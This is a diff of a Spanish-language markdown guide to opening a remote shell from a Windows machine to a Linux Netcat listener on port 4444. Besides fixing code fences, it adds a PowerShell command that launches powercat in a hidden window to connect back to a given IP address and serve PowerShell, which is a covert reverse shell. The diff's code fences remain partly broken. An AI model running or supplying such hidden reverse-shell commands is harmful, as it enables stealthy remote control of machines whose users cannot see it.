@@ -11,9 +11,9 @@ Guía paso a paso para establecer una shell remota entre una máquina Linux y un
 
 1. Abre una terminal.
 2. Ejecuta el siguiente comando para iniciar un listener con Netcat:
-   \`\`\`bash
+   ```bash
    nc -lvp 4444
-   \`\`\`
+   ```
    Donde `4444` es el puerto en el que deseas escuchar.
 
 ## En la máquina Windows (Conector)
@@ -32,3 +32,8 @@ Guía paso a paso para establecer una shell remota entre una máquina Linux y un
 
 Ahora, cuando te conectes desde tu máquina Linux, obtendrás una shell de PowerShell de tu máquina Windows.
 \`\`\`
+
+### Inicia una shell remota con la ventana de PowerShell oculta con el siguiente comando:
+   ```powershell
+   Start-Process powershell -ArgumentList "-WindowStyle Hidden -Command & {powercat -c <ip-address> -p 4444 -ep powershell}" 
+   \`\`\`
